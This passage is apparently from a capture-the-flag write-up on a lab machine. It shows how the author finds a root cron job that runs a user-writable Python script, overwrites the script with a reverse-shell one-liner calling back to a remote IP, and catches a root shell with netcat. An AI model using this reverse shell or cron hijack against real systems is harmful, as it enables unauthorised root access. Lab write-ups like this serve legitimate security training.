<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">Public</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>    <span class="mi">66</span> <span class="n">Sep</span> <span class="mi">20</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">selected_editor</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>   <span class="mi">870</span> <span class="n">Sep</span> <span class="mi">20</span>  <span class="mi">2017</span> <span class="n">server</span><span class="o">.</span><span class="n">js</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>     <span class="mi">0</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">sudo_as_admin_successful</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">Templates</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">Videos</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-------</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>    <span class="mi">48</span> <span class="n">Aug</span>  <span class="mi">5</span> <span class="mi">02</span><span class="p">:</span><span class="mi">45</span> <span class="o">.</span><span class="n">Xauthority</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-------</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>    <span class="mi">82</span> <span class="n">Aug</span>  <span class="mi">5</span> <span class="mi">02</span><span class="p">:</span><span class="mi">45</span> <span class="o">.</span><span class="n">xsession</span><span class="o">-</span><span class="n">errors</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-------</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">1302</span> <span class="n">Mar</span>  <span class="mi">7</span> <span class="mi">08</span><span class="p">:</span><span class="mi">33</span> <span class="o">.</span><span class="n">xsession</span><span class="o">-</span><span class="n">errors</span><span class="o">.</span><span class="n">old</span>

<span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import pty; pty.spawn("/bin/bash")'</span>  

<span class="n">find</span> <span class="o">-</span><span class="n">iname</span> <span class="s">'user.txt'</span>
<span class="o">./</span><span class="n">Documents</span><span class="o">/</span><span class="n">user</span><span class="o">.</span><span class="n">txt</span>
<span class="n">cat</span> <span class="n">Documents</span><span class="o">/</span><span class="n">user</span><span class="o">.</span><span class="n">txt</span>
<span class="mi">9</span><span class="n">a093cd22ce86b7f41db4116e80d0b0f</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /var/log
<span class="nb">cat </span>syslog
<span class="o">(</span>...<span class="o">)</span>
Aug  5 03:30:01 sun CRON[11472]: <span class="o">(</span>root<span class="o">)</span> CMD <span class="o">(</span>python /home/sun/Documents/script.py <span class="o">&gt;</span> /home/sun/output.txt<span class="p">;</span> <span class="nb">cp</span> /root/script.py /home/sun/Documents/script.py<span class="p">;</span> <span class="nb">chown </span>sun:sun /home/sun/Documents/script.py<span class="p">;</span> chattr <span class="nt">-i</span> /home/sun/Documents/script.py<span class="p">;</span> <span class="nb">touch</span> <span class="nt">-d</span> <span class="s2">"</span><span class="k">$(</span><span class="nb">date</span> <span class="nt">-R</span> <span class="nt">-r</span> /home/sun/Documents/user.txt<span class="k">)</span><span class="s2">"</span> /home/sun/Documents/script.py<span class="o">)</span>

<span class="o">(</span>...<span class="o">)</span>
Aug  5 03:35:01 sun CRON[21608]: <span class="o">(</span>root<span class="o">)</span> CMD <span class="o">(</span>python /home/sun/Documents/script.py <span class="o">&gt;</span> /home/sun/output.txt<span class="p">;</span> <span class="nb">cp</span> /root/script.py /home/sun/Documents/script.py<span class="p">;</span> <span class="nb">chown </span>sun:sun /home/sun/Documents/script.py<span class="p">;</span> chattr <span class="nt">-i</span> /home/sun/Documents/script.py<span class="p">;</span> <span class="nb">touch</span> <span class="nt">-d</span> <span class="s2">"</span><span class="k">$(</span><span class="nb">date</span> <span class="nt">-R</span> <span class="nt">-r</span> /home/sun/Documents/user.txt<span class="k">)</span><span class="s2">"</span> /home/sun/Documents/script.py<span class="o">)</span>

<span class="o">(</span>...<span class="o">)</span>
Aug  5 03:40:01 sun CRON[31742]: <span class="o">(</span>root<span class="o">)</span> CMD <span class="o">(</span>python /home/sun/Documents/script.py <span class="o">&gt;</span> /home/sun/output.txt<span class="p">;</span> <span class="nb">cp</span> /root/script.py /home/sun/Documents/script.py<span class="p">;</span> <span class="nb">chown </span>sun:sun /home/sun/Documents/script.py<span class="p">;</span> chattr <span class="nt">-i</span> /home/sun/Documents/script.py<span class="p">;</span> <span class="nb">touch</span> <span class="nt">-d</span> <span class="s2">"</span><span class="k">$(</span><span class="nb">date</span> <span class="nt">-R</span> <span class="nt">-r</span> /home/sun/Documents/user.txt<span class="k">)</span><span class="s2">"</span> /home/sun/Documents/script.py<span class="o">)</span>
<span class="o">(</span>...<span class="o">)</span>

</code></pre></div></div>

<p>This cron runs every 5. Why donâ€™t we edit <code class="highlighter-rouge">/home/sun/Documents/script.py</code> like this?</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span> <span class="s">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.172",41337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">sun</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">script</span><span class="o">.</span><span class="n">py</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-l</span> 10.10.14.35 41337
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
# ls
root.txt
script.py
# cat root.txt
ba1d0019200a54e370ca151007a8095a
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# ls /home
sun
# ^C
</span></code></pre></div></div>


  <h2>Latest Posts</h2>

  <ul class="post-list">
    
      - <a href="/offsec/2018/10/21/HTB-active.html"> Htb Active</a>
      <br>
    
      - <a href="/offsec/2018/09/24/HTB-nibbles.html"> Htb Nibbles</a>
      <br>
    
      - <a href="/offsec/2018/09/24/HTB-celestial.html"> Htb Celestial</a>
      <br>
    
      - <a href="/offsec/2018/08/05/Nsec-2018.html"> Nsec 2018</a>
      <br>
    
      - <a href="/offsec/2018/06/25/HTB-valentine.html"> Htb Valentine</a>
      <br>
    
  </ul>

</div>


      <footer class="site-footer">
        <!-- SVG icons from https://iconmonstr.com -->

        <!-- Github icon -->
        <span class="my-span-icon">
          <a href="" aria-label="'s GitHub" title="'s GitHub">
            <svg class="my-svg-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
          </a>
        </span>

        <!-- Twitter icon -->
        <span class="my-span-icon">
          <a href="https://twitter.com/srb01246810" aria-label="'s Twitter" title="'s Twitter">
            <svg class="my-svg-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm6.066 9.645c.183 4.04-2.83 8.544-8.164 8.544-1.622 0-3.131-.476-4.402-1.291 1.524.18 3.045-.244 4.252-1.189-1.256-.023-2.317-.854-2.684-1.995.451.086.895.061 1.298-.049-1.381-.278-2.335-1.522-2.304-2.853.388.215.83.344 1.301.359-1.279-.855-1.641-2.544-.889-3.835 1.416 1.738 3.533 2.881 5.92 3.001-.419-1.796.944-3.527 2.799-3.527.825 0 1.572.349 2.096.907.654-.128 1.27-.368 1.824-.697-.215.671-.67 1.233-1.263 1.589.581-.07 1.135-.224 1.649-.453-.384.578-.87 1.084-1.433 1.489z"/></svg>
          </a>
        </span>

        <!-- RSS icon -->
        
        <!-- Contact icon -->
        
        

      </footer>
    </section>

    
  </body>
</html>
